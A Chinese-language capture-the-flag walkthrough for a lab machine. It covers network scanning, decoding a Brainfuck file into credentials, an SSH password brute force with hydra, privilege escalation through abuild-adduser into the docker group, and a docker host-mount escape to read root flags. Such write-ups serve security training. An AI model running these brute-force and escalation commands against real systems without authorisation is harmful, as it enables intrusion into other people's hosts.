# 一、信息收集

使用 `arp-scan` 扫描本地网络，发现目标主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.153 08:00:27:b6:8c:d1       PCS Systemtechnik GmbH
...
```

对目标主机进行端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.153
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 12:56 GMT
Nmap scan report for 192.168.205.153
Host is up (0.00027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:B6:8C:D1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

**端口分析：**

- 22/tcp: SSH 服务
- 80/tcp: HTTP 服务（运行 NexusPHP 1.9.6 论坛）
- 8080/tcp: NoVNC 服务

# 二、服务探测

访问 80 端口发现是 NexusPHP 1.9.6 版本的 CMS 论坛，这是最新版本，暂未发现可利用漏洞。

8080 端口运行 NoVNC 服务，可以通过浏览器连接到一个 Docker 容器的 VNC 桌面环境。

# 三、关键信息获取

在 VNC 环境的根目录下发现一个名为 `secret` 的文件，内容为 Brainfuck 语言编写的代码。由于 NoVNC 环境的复制粘贴功能存在限制，需要特殊方法来处理这个文件。

> [!Tip]
>
> https://github.com/alew140/stupid-NoVNC-copy-paste/tree/main
>
> 我用不了，我叫ai改了一下

## 3.1 NoVNC 复制粘贴解决方案

使用修改过的 JavaScript 脚本来解决 NoVNC 的复制粘贴问题：

```javascript
class VNCPaste {
    constructor(config = {}) {
        this.config = {
            selector: '#noVNC_canvas',
            fallbackSelector: 'canvas',
            baseDelay: 80,
            specialDelay: 160,
            enableLogging: true,
            middleClickEnabled: true,
            ...config
        };
        this.canvas = null;
        this.isInitialized = false;
        const shiftPairs = {
            '~': '`', '!': '1', '@': '2', '#': '3', '$': '4',
            '%': '5', '^': '6', '&': '7', '*': '8', '(': '9',
            ')': '0', '_': '-', '+': '=', '{': '[', '}': ']',
            '|': '\\', ':': ';', '"': "'", '<': ',', '>': '.',
            '?': '/'
        };
        this.specialKeys = new Map(
            Object.entries(shiftPairs).map(([sym, base]) => [sym, { key: base, shiftKey: true }])
        );
    }
    log(...args) { if (this.config.enableLogging) console.log('[VNCPaste]', ...args); }
    error(...args) { console.error('[VNCPaste]', ...args); }
    findCanvas() {
        this.canvas = document.querySelector(this.config.selector) ||
                      document.querySelector(this.config.fallbackSelector);
        if (!this.canvas) throw new Error('Canvas not found');
        return this.canvas;
    }
    createKeyboardEvent(type, key, options = {}) {
        return new KeyboardEvent(type, {
            key,
            keyCode: key.charCodeAt(0),
            charCode: key.charCodeAt(0),
            which: key.charCodeAt(0),
            bubbles: true,
            ...options
        });
    }
    async sendKeyboardEvents(char) {
        const mapping = this.specialKeys.get(char);
        let keyInfo = mapping 
            ? mapping 
            : /[A-Z]/.test(char) ? { key: char, shiftKey: true } : { key: char, shiftKey: false };
        const delay = mapping ? this.config.specialDelay : this.config.baseDelay;
        for (const ev of ['keydown', 'keypress', 'keyup']) {
            await new Promise(res => {
                setTimeout(() => {
                    this.canvas.dispatchEvent(
                        this.createKeyboardEvent(ev, char, { shiftKey: keyInfo.shiftKey })
                    );
                    this.log(`发送 ${ev}: '${char}' (shift=${keyInfo.shiftKey})`);
                    res();
                }, 10);
            });
        }
        await new Promise(res => setTimeout(res, delay));
    }
    async sendString(text) {
        if (!this.canvas) return this.error('Canvas not initialized');
        this.canvas.focus();
        await new Promise(res => setTimeout(res, 200));
        for (let i = 0; i < text.length; i++) {
            try { await this.sendKeyboardEvents(text[i]); }
            catch (e) { this.error(`字符 '${text[i]}' 出错:`, e); }
        }
        this.log("发送完毕");
    }
    async showCustomInputBox() {
        return new Promise(resolve => {
            let overlay = document.createElement('div');
            Object.assign(overlay.style, {
                position: 'fixed', top: 0, left: 0, width: '100%', height: '100%',
                background: 'rgba(0,0,0,0.6)', display: 'flex',
                alignItems: 'center', justifyContent: 'center', zIndex: 9999
            });
            let box = document.createElement('div');
            Object.assign(box.style, {
                background: '#fff', padding: '20px', borderRadius: '8px',
                display: 'flex', flexDirection: 'column', minWidth: '300px'
            });
            let textarea = document.createElement('textarea');
            textarea.rows = 4; textarea.style.width = '100%';
            textarea.placeholder = '粘贴要发送的内容...';
            let btn = document.createElement('button');
            btn.textContent = '发送'; btn.style.marginTop = '10px';
            btn.onclick = () => { document.body.removeChild(overlay); resolve(textarea.value); };
            box.appendChild(textarea); box.appendChild(btn); overlay.appendChild(box);
            document.body.appendChild(overlay); textarea.focus();
        });
    }
    async handleMiddleClick(e) {
        if (e.button === 1 && this.config.middleClickEnabled) {
            e.preventDefault();
            this.canvas.focus();
            let text = await this.showCustomInputBox();
            if (text) await this.sendString(text);
        }
    }
    init() {
        if (this.isInitialized) return this.error('Already initialized');
        this.findCanvas();
        this.canvas.addEventListener('mouseup', this.handleMiddleClick.bind(this));
        this.canvas.addEventListener('contextmenu', e => e.preventDefault());
        window.sendString = this.sendString.bind(this);
        this.isInitialized = true;
        this.log('VNCPaste 中键触发版已初始化');
    }
    destroy() {
        if (!this.isInitialized) return;
        this.canvas.removeEventListener('mouseup', this.handleMiddleClick.bind(this));
        delete window.sendString;
        this.isInitialized = false;
        this.log('销毁完成');
    }
}
const vncPaste = new VNCPaste();
vncPaste.init();
```

中键触发（控制台输入加载）

## 3.2 Brainfuck 解释器

创建 Python 脚本解析 Brainfuck 代码：

```python
cd 
cat > bf.py << 'EOF'
#!/usr/bin/env python3
class BfInterpreter:
    def __init__(self):
        self.mem = [0] * 30000
        self.ptr = 0
        self.code_ptr = 0
        self.input_buf = []
        self.output_buf = []
        
    def run(self, code, input_data=""):
        self.reset()
        self.input_buf = list(input_data.encode())
        code = ''.join(c for c in code if c in '><+-.,[]')
        self.code = code
        
        while self.code_ptr < len(code):
            cmd = code[self.code_ptr]
            
            if cmd == '>':
                self.ptr = (self.ptr + 1) % 30000
            elif cmd == '<':
                self.ptr = (self.ptr - 1) % 30000
            elif cmd == '+':
                self.mem[self.ptr] = (self.mem[self.ptr] + 1) % 256
            elif cmd == '-':
                self.mem[self.ptr] = (self.mem[self.ptr] - 1) % 256
            elif cmd == '.':
                self.output_buf.append(chr(self.mem[self.ptr]))
            elif cmd == ',':
                if self.input_buf:
                    self.mem[self.ptr] = self.input_buf.pop(0)
                else:
                    self.mem[self.ptr] = 0
            elif cmd == '[':
                if self.mem[self.ptr] == 0:
                    self.jump_forward()
            elif cmd == ']':
                if self.mem[self.ptr] != 0:
                    self.jump_backward()
                    
            self.code_ptr += 1
            
        return ''.join(self.output_buf)
    
    def jump_forward(self):
        bracket_count = 1
        while bracket_count > 0 and self.code_ptr < len(self.code) - 1:
            self.code_ptr += 1
            if self.code[self.code_ptr] == '[':
                bracket_count += 1
            elif self.code[self.code_ptr] == ']':
                bracket_count -= 1
    
    def jump_backward(self):
        bracket_count = 1
        while bracket_count > 0 and self.code_ptr > 0:
            self.code_ptr -= 1
            if self.code[self.code_ptr] == ']':
                bracket_count += 1
            elif self.code[self.code_ptr] == '[':
                bracket_count -= 1
    
    def reset(self):
        self.mem = [0] * 30000
        self.ptr = 0
        self.code_ptr = 0
        self.output_buf = []
if __name__ == "__main__":
    bf = BfInterpreter()
    
    try:
        with open('/secret', 'r') as f:
            code = f.read()
        result = bf.run(code)
        print(result)
    except:
        print("Interactive mode:")
        while True:
            try:
                code = input("BF> ")
                if code == 'quit':
                    break
                result = bf.run(code)
                if result:
                    print(result)
            except KeyboardInterrupt:
                break
EOF
python3 bf.py

```

执行后得到解码结果：

```
lilix:32691ca63c0677d0394b7e746569423c
```

# 四、权限获取

## 4.1 论坛登录问题绕过

尝试使用获得的凭据登录论坛时，发现用户因长期未登录被封禁。采用以下方法绕过：

1. 关闭靶机并重新部署
2. 断开靶机网络连接
3. 将宿主机日期调整到 2025年9月之前
4. 重启靶机并尝试登录

## 4.2 种子信息分析

成功登录论坛后，在首页发现有两个"坏种"提示。在字幕页提示种子的地址是以`http://192.168.245.132/details.php?id=`的格式，通过 Burp Suite 爆破种子ID，发现：

- 种子4：`id_rsa`（暂时无用）
- 种子5：`pass.txt`（重点关注）

**种子下载分析：**
使用种子下载工具（如 Motrix）打开种子5，发现 `pass.txt` 文件大小仅为 11 B。

## 4.3 密码破解

基于文件大小为 11 B的线索，从2020佬常用密码字典中提取相同长度的密码：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ awk 'length($0)==11' xato-net-10-million-passwords.txt > pass

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wc -l pass       
236238 pass

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -l lilix -P pass ssh://192.168.205.160 -f -I -t 10
...
[22][ssh] host: 192.168.205.160   login: lilix   password: bladerunner
...
```

**注意：** 使用 rockyou.txt 字典效果更差，`bladerunner` 在其中排名第 1104 位。

# 五、权限提升

## 5.1 SSH 登录

使用破解得到的凭据登录 SSH：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh lilix@192.168.205.160
lilix@192.168.205.160's password: bladerunner

transmission:~$ id
uid=1000(lilix) gid=1000(lilix) groups=300(abuild),1000(lilix)

transmission:~$ find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
---s--x--x    1 root     root         14224 Jan 18  2025 /bin/bbsuid
-r-sr-xr-x    1 root     root         14224 Jan  4  2025 /usr/bin/abuild-sudo
-rwsr-xr-x    1 root     root         69648 Feb 14  2025 /sbin/apk
```

## 5.2 利用 abuild-sudo 提权

- `abuild-sudo` 是Alpine Linux包构建系统的一部分
- 设计初衷：允许 `abuild` 组成员以root权限执行特定构建任务
- **漏洞**：权限检查不够严格，可以创建用户并分配任意组

```bash
transmission:~$ /usr/bin/abuild-adduser test -G docker
Changing password for test
New password: 1
Bad password: too short
Retype password: 1
passwd: password for test changed by root

transmission:~$ su test
Password: 1
```

## 5.3 Docker 容器逃逸

利用 Docker 组权限挂载主机根目录，实现容器逃逸：

```bash
/home/lilix $ docker run -v /:/mnt --rm -it --entrypoint="" $(docker images -q | head -1) /bin/bash

root@a8bd7177e2a2:/# cd mnt/
root@a8bd7177e2a2:/mnt# cat root/R007.F1A9 home/lilix/user.flag 
flag{146be38677f379dabf37c7c4ccc386cd}
flag{93b1224cd1be328c27fbd951cb4cc903}
```